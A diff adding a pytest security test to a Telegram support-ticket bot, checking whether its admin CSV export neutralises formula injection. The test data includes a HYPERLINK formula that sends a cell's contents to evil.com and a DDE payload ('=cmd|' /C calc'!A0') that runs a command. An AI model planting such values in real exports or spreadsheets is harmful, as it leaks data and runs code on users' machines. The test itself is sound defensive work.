@@ -364,3 +364,88 @@ async def test_admin_reply_html_injection(test_session):
     # Failure means vulnerability.
     assert "&lt;a href" in sent_text or "<a" not in sent_text, \
         "VULNERABILITY DETECTED: HTML Injection in Admin Reply was rendered!"
+
+@pytest.mark.asyncio
+async def test_csv_formula_injection(test_session):
+    """
+    TEST: CSV Injection / Formula Injection.
+    """
+    import csv
+    import io
+    from handlers.admin import export_statistics_cmd
+    from database.models import UserRole
+    from aiogram import types
+
+    # 1. Setup Malicious Data
+    user = User(
+        external_id=666,
+        source=SourceType.TELEGRAM,
+        full_name="=HYPERLINK(\"http://evil.com?leak=\"&A1, \"Error\")", # Malicious Name
+        username="hacker",
+        role=UserRole.USER
+    )
+    test_session.add(user)
+
+    category = Category(name="General")
+    test_session.add(category)
+    await test_session.flush()
+
+    # Malicious Ticket Text
+    malicious_text = "=cmd|' /C calc'!A0"
+
+    ticket = Ticket(
+        user_id=user.id,
+        daily_id=1,
+        category_id=category.id,
+        status=TicketStatus.NEW,
+        priority=TicketPriority.NORMAL,
+        source=SourceType.TELEGRAM,
+        question_text=malicious_text,
+        created_at=None,
+        closed_at=None
+    )
+    test_session.add(ticket)
+    await test_session.commit()
+
+    # 2. Mock Admin & Command
+    admin_user = MagicMock()
+    admin_user.id = 777
+
+    message = AsyncMock(spec=types.Message)
+    message.from_user = admin_user
+    message.answer = AsyncMock()
+    message.answer_document = AsyncMock()
+
+    command = MagicMock()
+    command.args = "30"
+
+    # 3. Patch Permissions
+    with patch("handlers.admin.is_admin_or_mod", return_value=True):
+        await export_statistics_cmd(message, command, test_session)
+
+    # 4. Verify CSV Content
+    assert message.answer_document.called
+    args, _ = message.answer_document.call_args
+    buffered_file = args[0]
+
+    content_bytes = buffered_file.data
+    content_str = content_bytes.decode('utf-8-sig')
+
+    reader = csv.reader(io.StringIO(content_str))
+    header = next(reader)
+    row = next(reader)
+
+    exported_name = row[7]
+    exported_text = row[12]
+
+    print(f"Exported Name: {exported_name}")
+    print(f"Exported Text: {exported_text}")
+
+    if exported_name.startswith("="):
+        pytest.fail("VULNERABILITY DETECTED: CSV Injection in User Name (starts with =)")
+
+    if exported_text.startswith("="):
+        pytest.fail("VULNERABILITY DETECTED: CSV Injection in Ticket Text (starts with =)")
+
+    assert exported_name.startswith("'") or not exported_name.startswith("=")
+    assert exported_text.startswith("'") or not exported_text.startswith("=")
